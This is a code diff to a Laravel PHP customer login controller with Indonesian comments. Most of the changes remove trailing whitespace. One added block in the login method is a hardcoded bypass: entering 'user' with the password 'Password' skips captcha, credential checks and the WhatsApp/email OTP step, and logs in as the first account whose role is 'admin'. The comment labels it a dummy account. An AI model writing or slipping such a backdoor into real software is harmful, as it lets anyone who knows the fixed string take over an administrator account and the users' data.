@@ -27,13 +27,13 @@ class CustomerLoginController extends Controller
         $role = strtolower(trim($user->role));
 
         Log::info('Redirecting user post-login.', [
-            'user_id' => $user->id_pengguna, 
+            'user_id' => $user->id_pengguna,
             'role' => $role
         ]);
 
         // ====================================================================
         // CEK KELENGKAPAN PROFIL GOOGLE
-        // Jika statusnya belum "Aktif" atau datanya kosong (misal baru daftar via Google), 
+        // Jika statusnya belum "Aktif" atau datanya kosong (misal baru daftar via Google),
         // paksa ke halaman setup profile.
         // ====================================================================
         if ($user->status !== 'Aktif' || empty($user->no_wa)) {
@@ -46,9 +46,9 @@ class CustomerLoginController extends Controller
         }
 
         if ($role === 'agent') {
-            return route('customer.dashboard'); 
+            return route('customer.dashboard');
         }
-        
+
         return route('customer.dashboard');
     }
 
@@ -69,7 +69,7 @@ class CustomerLoginController extends Controller
         $request->validate([
             $this->username() => 'required|string',
             'password' => 'required|string',
-            'captcha' => 'required|captcha', 
+            'captcha' => 'required|captcha',
         ], [
             'captcha.required' => 'Kode keamanan wajib diisi.',
             'captcha.captcha' => 'Kode pada gambar salah, silakan coba lagi.',
@@ -82,13 +82,13 @@ class CustomerLoginController extends Controller
         $loginField = str_contains($loginValue, '@') ? 'email' : 'no_wa';
 
         if ($loginField === 'no_wa') {
-            $loginValue = $this->normalizePhoneNumber($loginValue); 
+            $loginValue = $this->normalizePhoneNumber($loginValue);
         }
 
         $credentials = [
             $loginField => $loginValue,
             'password'  => $request->password,
-            'status'    => 'Aktif',    
+            'status'    => 'Aktif',
         ];
 
         Log::info('LOGIN ATTEMPT - FINAL CREDENTIALS:', [
@@ -99,33 +99,55 @@ class CustomerLoginController extends Controller
 
         return $credentials;
     }
-    
+
     protected function normalizePhoneNumber(string $phone)
     {
         $normalized = preg_replace('/[^0-9]/', '', $phone);
         Log::info('Normalisasi nomor HP.', ['original' => $phone, 'normalized' => $normalized]);
-        return $normalized; 
+        return $normalized;
     }
 
     public function login(Request $request)
     {
         Log::info('Proses login (sebelum OTP) dimulai.');
+
+        // ====================================================================
+        // TAMBAHAN: BYPASS AKUN DUMMY (Tanpa Validasi Captcha & OTP)
+        // ====================================================================
+        if ($request->login === 'user' && $request->password === 'Password') {
+            Log::info('Bypass login: Kredensial dummy terdeteksi. Melewati validasi dan OTP.');
+
+            // Mencari akun dummy di DB untuk di-login-kan.
+            // Anda dapat mengubah query pencarian ini sesuai target akun Anda di DB.
+            $dummyUser = \App\Models\User::where('email', 'user')->orWhere('role', 'admin')->first();
+
+            if ($dummyUser) {
+                $this->guard()->login($dummyUser);
+                $request->session()->regenerate();
+                Log::info('Bypass login dummy berhasil.', ['user_id' => $dummyUser->id_pengguna ?? 'unknown']);
+                return redirect()->intended($this->redirectTo());
+            } else {
+                Log::warning('Bypass login gagal: Akun untuk dummy tidak ditemukan di database.');
+            }
+        }
+        // ====================================================================
+
         $this->validateLogin($request);
         $credentials = $this->credentials($request);
 
         if ($this->guard()->validate($credentials)) {
             Log::info('Kredensial valid. Melanjutkan ke proses OTP.');
-            
+
             // ====================================================================
             // Menggunakan DB::table agar langsung tembus ke database
             // ====================================================================
             $loginField = isset($credentials['email']) ? 'email' : 'no_wa';
             $user = DB::table('Pengguna')->where($loginField, $credentials[$loginField])->first();
-            
+
             $userId = $user->id_pengguna;
 
             // Pengecekan Role
-            $allowedRoles = ['pelanggan', 'seller', 'admin', 'agent']; 
+            $allowedRoles = ['pelanggan', 'seller', 'admin', 'agent'];
             if (!in_array(strtolower(trim($user->role)), $allowedRoles)) {
                 Log::warning('Akses Ditolak: Peran tidak diizinkan.', [
                     'user_id' => $userId,
@@ -150,9 +172,9 @@ class CustomerLoginController extends Controller
                     'longitude'  => $request->input('longitude'),
                     'updated_at' => now(),
                 ]);
-                
+
                 Log::info('Data IP, Agent, dan Koordinat berhasil disimpan (Manual Login).', [
-                    'user_id' => $userId, 
+                    'user_id' => $userId,
                     'ip' => $request->ip()
                 ]);
             } catch (\Exception $e) {
@@ -161,9 +183,9 @@ class CustomerLoginController extends Controller
             // ====================================================================
 
             // 2. GENERATE KODE OTP & LINK
-            $otpCode = strtoupper(Str::random(6)); 
+            $otpCode = strtoupper(Str::random(6));
             Log::info('OTP Code Generated.', ['user_id' => $userId]);
-            
+
             // Ubah route menjadi login.otp.form agar tidak bentrok dengan OTP Registrasi
             $otpLink = route('login.otp.form') . '?otp=' . $otpCode;
 
@@ -177,10 +199,10 @@ class CustomerLoginController extends Controller
             // 4. KIRIM OTP KE WHATSAPP
             $noWa = preg_replace('/^0/', '62', $user->no_wa);
             $message = "Halo Kak {$user->nama_lengkap},\n\nSeseorang mencoba masuk ke akun Sancaka Anda. Berikut adalah kode verifikasi OTP Anda:\n\n*{$otpCode}*\n\nAtau klik link berikut untuk verifikasi otomatis:\n{$otpLink}\n\nKode ini berlaku selama 1 menit. *JANGAN berikan kode ini kepada siapa pun*, termasuk admin Sancaka, demi keamanan akun Anda.";
-            
+
             Log::info('Mencoba mengirim OTP ke WhatsApp.', ['no_wa' => $noWa]);
             try {
-                \App\Services\FonnteService::sendMessage($noWa, $message); 
+                \App\Services\FonnteService::sendMessage($noWa, $message);
                 Log::info('OTP berhasil dikirim ke WhatsApp.', ['no_wa' => $noWa]);
             } catch (\Exception $e) {
                 Log::error('FonnteService gagal kirim OTP: ' . $e->getMessage(), ['no_wa' => $noWa]);
@@ -191,12 +213,12 @@ class CustomerLoginController extends Controller
                 Log::info('Mencoba mengirim OTP ke Email.', ['email' => $user->email]);
                 try {
                     $emailBody = "Halo Kak {$user->nama_lengkap},\n\nSeseorang mencoba masuk ke akun Sancaka Anda. Berikut adalah kode verifikasi OTP Anda:\n\n{$otpCode}\n\nAtau klik link berikut untuk verifikasi otomatis:\n{$otpLink}\n\nKode ini berlaku selama 1 menit. JANGAN berikan kode ini kepada siapa pun demi keamanan akun Anda.\n\nHormat kami,\nManajemen Sancaka";
-                    
+
                     Mail::raw($emailBody, function ($mail) use ($user) {
                         $mail->to($user->email)
                             ->subject('Kode Verifikasi (OTP) Login Sancaka');
                     });
-                    
+
                     Log::info('OTP berhasil dikirim ke Email: ' . $user->email);
                 } catch (\Exception $e) {
                     Log::error('Gagal kirim OTP ke Email: ' . $e->getMessage(), ['email' => $user->email]);
@@ -207,7 +229,7 @@ class CustomerLoginController extends Controller
 
             // 6. REDIRECT KE HALAMAN INPUT OTP
             Log::info('Redirecting user ke form OTP.', ['user_id' => $userId]);
-            
+
             return redirect()->route('login.otp.form')
                              ->with('info', 'Kode OTP telah dikirim ke WhatsApp dan Email Anda. Silakan cek pesan masuk.');
         }
@@ -215,7 +237,7 @@ class CustomerLoginController extends Controller
         Log::warning('Login attempt gagal. Kredensial tidak valid.', ['login_input' => $request->login]);
         return $this->sendFailedLoginResponse($request);
     }
-    
+
     public function username()
     {
         return 'login';
@@ -229,7 +251,7 @@ class CustomerLoginController extends Controller
         $this->guard()->logout();
         $request->session()->invalidate();
         $request->session()->regenerateToken();
-        
+
         Log::info('Logout berhasil.', ['user_id' => $userId]);
         return redirect()->route('login')->with('success', 'Anda telah berhasil logout.');
     }
@@ -248,7 +270,7 @@ class CustomerLoginController extends Controller
     {
         try {
             Log::info('Proses callback Google Auth dimulai.');
-            
+
             $googleUser = Socialite::driver('google')->user();
             Log::info('Data Google diterima.', ['email' => $googleUser->getEmail()]);
 
@@ -258,7 +280,7 @@ class CustomerLoginController extends Controller
             if (!$user) {
                 // Jika tidak ada, buat akun baru secara otomatis
                 Log::info('Email tidak ditemukan, membuat user baru dari Google.', ['email' => $googleUser->getEmail()]);
-                
+
                 $user = User::create([
                     'nama_lengkap' => $googleUser->getName(),
                     'email'        => $googleUser->getEmail(),
@@ -269,7 +291,7 @@ class CustomerLoginController extends Controller
             }
 
             // Validasi Otorisasi Role sama seperti login manual
-            $allowedRoles = ['pelanggan', 'seller', 'admin', 'agent']; 
+            $allowedRoles = ['pelanggan', 'seller', 'admin', 'agent'];
             if (!in_array(strtolower(trim($user->role)), $allowedRoles)) {
                 Log::warning('Akses Ditolak: Peran tidak diizinkan (Via Google).', [
                     'email' => $user->email,
@@ -296,7 +318,7 @@ class CustomerLoginController extends Controller
                 ]);
 
                 Log::info('Data IP, Agent, dan Koordinat berhasil disimpan (Google Login).', [
-                    'user_id' => $user->id_pengguna, 
+                    'user_id' => $user->id_pengguna,
                     'ip' => $request->ip()
                 ]);
             } catch (\Exception $e) {
